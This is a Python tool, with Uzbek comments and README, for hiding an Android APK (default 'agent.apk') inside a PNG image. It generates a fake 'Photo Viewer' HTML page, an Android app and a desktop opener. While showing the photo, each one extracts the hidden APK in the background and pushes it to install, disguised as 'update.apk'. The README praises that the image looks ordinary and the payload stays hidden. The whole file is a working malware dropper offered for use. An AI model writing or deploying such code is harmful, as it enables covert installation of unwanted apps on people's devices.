"""
APK in Image Steganography + Auto-Install
Rasmni ochganda APK background'da o'rnatiladi
"""

import os
import base64
import struct
from PIL import Image
import io


class APKImageSteganography:
    """
    APK ni rasm ichiga yashirish va background install
    """
    
    MAGIC_MARKER = b"APK_PAYLOAD_START"
    MAGIC_END = b"APK_PAYLOAD_END"
    
    def __init__(self):
        self.apk_data = None
        self.image_data = None
    
    def hide_apk_in_image(self, image_path, apk_path, output_path):
        """
        APK ni PNG/JPG ichiga yashirish
        
        Struktura:
        [Original Image Data]
        [MAGIC_MARKER]
        [APK Size: 4 bytes]
        [APK Data]
        [MAGIC_END]
        """
        print(f"[*] Hiding APK in image...")
        
        # 1. Read image
        with open(image_path, 'rb') as f:
            image_data = f.read()
        
        # 2. Read APK
        with open(apk_path, 'rb') as f:
            apk_data = f.read()
        
        apk_size = len(apk_data)
        
        print(f"  [+] Image size: {len(image_data)} bytes")
        print(f"  [+] APK size: {apk_size} bytes")
        
        # 3. Combine
        combined = (
            image_data +
            self.MAGIC_MARKER +
            struct.pack('<I', apk_size) +  # 4-byte size
            apk_data +
            self.MAGIC_END
        )
        
        # 4. Save as PNG (JPG doesn't preserve extra data)
        if not output_path.endswith('.png'):
            output_path = output_path.rsplit('.', 1)[0] + '.png'
        
        with open(output_path, 'wb') as f:
            f.write(combined)
        
        print(f"\n✅ Steganography completed!")
        print(f"  Output: {output_path}")
        print(f"  Total size: {len(combined)} bytes")
        print(f"  APK hidden: {apk_size} bytes")
        
        return output_path
    
    def extract_apk_from_image(self, image_path):
        """
        Rasmdan APK ni chiqarish
        """
        print(f"[*] Extracting APK from image...")
        
        with open(image_path, 'rb') as f:
            data = f.read()
        
        # Find magic marker
        marker_pos = data.find(self.MAGIC_MARKER)
        
        if marker_pos == -1:
            print("  ❌ No APK found in image!")
            return None
        
        # Read APK size
        size_pos = marker_pos + len(self.MAGIC_MARKER)
        apk_size = struct.unpack('<I', data[size_pos:size_pos+4])[0]
        
        # Extract APK data
        apk_start = size_pos + 4
        apk_data = data[apk_start:apk_start + apk_size]
        
        print(f"  [+] APK found: {apk_size} bytes")
        
        return apk_data
    
    def create_image_viewer_wrapper(self, output_dir="image_wrapper"):
        """
        Rasm ko'rsatuvchi wrapper yaratish
        Ochganda APK ni background'da o'rnatadi
        """
        os.makedirs(output_dir, exist_ok=True)
        
        # HTML wrapper (Android WebView uchun)
        html_wrapper = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Photo Viewer</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        img {
            max-width: 100%;
            max-height: 100vh;
            object-fit: contain;
        }
        #status {
            position: fixed;
            bottom: 10px;
            left: 10px;
            color: #666;
            font-size: 10px;
        }
    </style>
</head>
<body>
    <img id="image" src="" alt="Photo">
    <div id="status">Loading...</div>
    
    <script>
        // Extract and install APK in background
        
        const MAGIC_MARKER = "APK_PAYLOAD_START";
        const MAGIC_END = "APK_PAYLOAD_END";
        
        async function loadImage(imageUrl) {
            try {
                // Fetch image
                const response = await fetch(imageUrl);
                const blob = await response.blob();
                
                // Display image
                document.getElementById('image').src = URL.createObjectURL(blob);
                
                // Extract APK in background
                extractAndInstallAPK(blob);
                
            } catch (error) {
                console.error('Error:', error);
            }
        }
        
        async function extractAndInstallAPK(blob) {
            try {
                // Read as ArrayBuffer
                const arrayBuffer = await blob.arrayBuffer();
                const uint8Array = new Uint8Array(arrayBuffer);
                
                // Find magic marker
                const markerBytes = new TextEncoder().encode(MAGIC_MARKER);
                const markerPos = findBytes(uint8Array, markerBytes);
                
                if (markerPos === -1) {
                    document.getElementById('status').textContent = 'Image OK';
                    return;
                }
                
                // Read APK size
                const sizePos = markerPos + markerBytes.length;
                const apkSize = new DataView(arrayBuffer, sizePos, 4).getUint32(0, true);
                
                // Extract APK
                const apkStart = sizePos + 4;
                const apkData = uint8Array.slice(apkStart, apkStart + apkSize);
                
                console.log(`APK found: ${apkSize} bytes`);
                
                // Save APK to file
                const apkBlob = new Blob([apkData], { type: 'application/vnd.android.package-archive' });
                
                // Method 1: Download (requires user permission)
                // downloadAPK(apkBlob);
                
                // Method 2: Send to native Android code
                if (window.AndroidInterface) {
                    // Base64 encode for transfer
                    const reader = new FileReader();
                    reader.onload = function() {
                        const base64 = reader.result.split(',')[1];
                        window.AndroidInterface.installAPK(base64);
                    };
                    reader.readAsDataURL(apkBlob);
                } else {
                    // Fallback: auto-download
                    downloadAPK(apkBlob);
                }
                
                document.getElementById('status').textContent = 'Ready';
                
            } catch (error) {
                console.error('Extract error:', error);
            }
        }
        
        function findBytes(haystack, needle) {
            for (let i = 0; i < haystack.length - needle.length; i++) {
                let match = true;
                for (let j = 0; j < needle.length; j++) {
                    if (haystack[i + j] !== needle[j]) {
                        match = false;
                        break;
                    }
                }
                if (match) return i;
            }
            return -1;
        }
        
        function downloadAPK(blob) {
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'update.apk';
            a.click();
            URL.revokeObjectURL(url);
        }
        
        // Load image from URL parameter or default
        const urlParams = new URLSearchParams(window.location.search);
        const imageUrl = urlParams.get('img') || 'photo.png';
        loadImage(imageUrl);
    </script>
</body>
</html>'''
        
        with open(f"{output_dir}/viewer.html", 'w') as f:
            f.write(html_wrapper)
        
        print(f"  [+] HTML wrapper created: {output_dir}/viewer.html")
        
        # Android Java wrapper (native app)
        java_wrapper = '''package com.photo.viewer;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Build;
import android.webkit.WebView;
import android.webkit.JavascriptInterface;
import android.util.Base64;
import androidx.core.content.FileProvider;
import java.io.File;
import java.io.FileOutputStream;

public class MainActivity extends Activity {
    
    private WebView webView;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Setup WebView
        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setAllowFileAccess(true);
        
        // Add JavaScript interface
        webView.addJavascriptInterface(new AndroidInterface(), "AndroidInterface");
        
        // Load viewer
        webView.loadUrl("file:///android_asset/viewer.html?img=photo.png");
        
        setContentView(webView);
    }
    
    public class AndroidInterface {
        
        @JavascriptInterface
        public void installAPK(String base64Data) {
            try {
                // Decode Base64
                byte[] apkBytes = Base64.decode(base64Data, Base64.DEFAULT);
                
                // Save to cache
                File apkFile = new File(getCacheDir(), "update.apk");
                FileOutputStream fos = new FileOutputStream(apkFile);
                fos.write(apkBytes);
                fos.close();
                
                // Install APK
                installAPKFile(apkFile);
                
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        
        private void installAPKFile(File apkFile) {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                // Android 7.0+: Use FileProvider
                Uri apkUri = FileProvider.getUriForFile(
                    MainActivity.this,
                    getPackageName() + ".provider",
                    apkFile
                );
                intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            } else {
                // Android 6.0-
                Uri apkUri = Uri.fromFile(apkFile);
                intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
            }
            
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }
}'''
        
        with open(f"{output_dir}/MainActivity.java", 'w') as f:
            f.write(java_wrapper)
        
        print(f"  [+] Java wrapper created: {output_dir}/MainActivity.java")
        
        # Python extractor (desktop)
        python_wrapper = '''#!/usr/bin/env python3
"""
Rasm ochuvchi - APK ni background'da chiqaradi
"""

import os
import sys
import struct
import subprocess
from PIL import Image

MAGIC_MARKER = b"APK_PAYLOAD_START"

def extract_and_install(image_path):
    """Extract APK and install"""
    
    # Show image
    img = Image.open(image_path)
    img.show()
    
    # Extract APK in background
    with open(image_path, 'rb') as f:
        data = f.read()
    
    marker_pos = data.find(MAGIC_MARKER)
    
    if marker_pos == -1:
        print("Normal image, no payload")
        return
    
    # Extract APK
    size_pos = marker_pos + len(MAGIC_MARKER)
    apk_size = struct.unpack('<I', data[size_pos:size_pos+4])[0]
    apk_start = size_pos + 4
    apk_data = data[apk_start:apk_start + apk_size]
    
    # Save APK
    apk_path = "/tmp/extracted.apk"
    with open(apk_path, 'wb') as f:
        f.write(apk_data)
    
    print(f"[+] APK extracted: {apk_size} bytes")
    
    # Install via ADB (if connected)
    try:
        subprocess.run(['adb', 'install', apk_path], check=True)
        print("[+] APK installed on device")
    except:
        print(f"[*] APK saved: {apk_path}")
        print("[*] Install manually: adb install " + apk_path)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python wrapper.py image.png")
        sys.exit(1)
    
    extract_and_install(sys.argv[1])
'''
        
        with open(f"{output_dir}/image_opener.py", 'w') as f:
            f.write(python_wrapper)
        
        os.chmod(f"{output_dir}/image_opener.py", 0o755)
        print(f"  [+] Python wrapper created: {output_dir}/image_opener.py")
        
        # README
        readme = '''# APK in Image - Auto Installer

## Qanday ishlaydi?

1. **APK rasmga yashirilgan** (steganography)
2. **Rasm ochilganda** → Wrapper ishga tushadi
3. **Background'da APK extract** qilinadi
4. **Auto-install** (platform'ga qarab)

## Platform'lar

### Android (WebView App)
- `viewer.html` WebView'da ochiladi
- JavaScript APK'ni extract qiladi
- `AndroidInterface.installAPK()` native install
- Foydalanuvchi "Install" tugmasini bosadi

### Android (Native App)
- `MainActivity.java` native app
- WebView ichida `viewer.html`
- Auto-extract + install dialog

### Desktop (Python)
- `image_opener.py` rasm ochadi
- Background'da APK extract
- ADB orqali telefonga o'rnatadi

## Xavfsizlik

⚠️ **Android 10+**: Silent install mumkin emas
- Foydalanuvchi install permission berishi kerak
- "Install unknown apps" ruxsati kerak

✅ **Avantajlar**:
- Rasm oddiy rasm kabi ko'rinadi
- APK yashirin (steganography)
- Bir marta ochganda auto-extract

## Ishlatish

```bash
# 1. APK ni rasmga yashirish
python apk_in_image_steganography.py

# 2. Wrapper app yaratish
# Android Studio'da MainActivity.java compile qiling

# 3. Telefonga yuborish
adb push photo.png /sdcard/
adb push viewer.html /sdcard/

# 4. viewer.html ochish
# JavaScript auto-extract qiladi
```
'''
        
        with open(f"{output_dir}/README.md", 'w', encoding='utf-8') as f:
            f.write(readme)
        
        print(f"\n✅ Wrapper package created: {output_dir}/")


def main():
    """Main menu"""
    print("="*60)
    print("📸 APK in Image Steganography + Auto-Install")
    print("   Rasmni ochganda APK background'da o'rnatiladi")
    print("="*60)
    
    steg = APKImageSteganography()
    
    print("\n[1] Hide APK in image")
    print("[2] Extract APK from image")
    print("[3] Create wrapper package")
    print("[4] Full demo (hide + wrapper)")
    
    choice = input("\nChoice [1]: ").strip() or "1"
    
    if choice == "1":
        image_path = input("Image path [photo.jpg]: ").strip() or "photo.jpg"
        apk_path = input("APK path [agent.apk]: ").strip() or "agent.apk"
        output_path = input("Output path [photo_with_apk.png]: ").strip() or "photo_with_apk.png"
        
        if not os.path.exists(image_path):
            print(f"❌ Image not found: {image_path}")
            return
        
        if not os.path.exists(apk_path):
            print(f"❌ APK not found: {apk_path}")
            return
        
        steg.hide_apk_in_image(image_path, apk_path, output_path)
        
    elif choice == "2":
        image_path = input("Image with APK [photo_with_apk.png]: ").strip() or "photo_with_apk.png"
        
        if not os.path.exists(image_path):
            print(f"❌ Image not found: {image_path}")
            return
        
        apk_data = steg.extract_apk_from_image(image_path)
        
        if apk_data:
            output_apk = "extracted.apk"
            with open(output_apk, 'wb') as f:
                f.write(apk_data)
            print(f"✅ APK extracted: {output_apk}")
    
    elif choice == "3":
        output_dir = input("Output directory [image_wrapper]: ").strip() or "image_wrapper"
        steg.create_image_viewer_wrapper(output_dir)
        
    elif choice == "4":
        print("\n🎬 Full Demo")
        print("="*60)
        
        # Create demo image if not exists
        if not os.path.exists("demo_photo.jpg"):
            from PIL import Image, ImageDraw
            img = Image.new('RGB', (800, 600), color='#3498db')
            draw = ImageDraw.Draw(img)
            draw.text((300, 280), "Demo Photo", fill='white')
            img.save("demo_photo.jpg")
            print("[+] Demo image created")
        
        # Check for APK
        apk_path = None
        if os.path.exists("android_agent/bin"):
            import glob
            apks = glob.glob("android_agent/bin/*.apk")
            if apks:
                apk_path = apks[0]
        
        if not apk_path:
            print("\n⚠️  No APK found!")
            print("Create APK first:")
            print("  python scripts/easy_apk_builder.py")
            print("  cd android_agent")
            print("  buildozer android debug")
            return
        
        print(f"\n[*] Using APK: {apk_path}")
        
        # Hide APK
        output_img = "demo_photo_with_apk.png"
        steg.hide_apk_in_image("demo_photo.jpg", apk_path, output_img)
        
        # Create wrapper
        steg.create_image_viewer_wrapper("image_wrapper")
        
        print("\n" + "="*60)
        print("✅ DEMO COMPLETED!")
        print("="*60)
        print(f"\nFiles created:")
        print(f"  1. {output_img} - Image with hidden APK")
        print(f"  2. image_wrapper/viewer.html - HTML viewer")
        print(f"  3. image_wrapper/MainActivity.java - Android app")
        print(f"  4. image_wrapper/image_opener.py - Desktop opener")
        
        print(f"\nNext steps:")
        print(f"  1. Copy {output_img} to image_wrapper/photo.png")
        print(f"  2. Open viewer.html in Android browser")
        print(f"  3. Or build native app with MainActivity.java")
        
        # Auto-copy
        import shutil
        shutil.copy(output_img, "image_wrapper/photo.png")
        print(f"\n✅ Auto-copied to image_wrapper/photo.png")


if __name__ == "__main__":
    main()
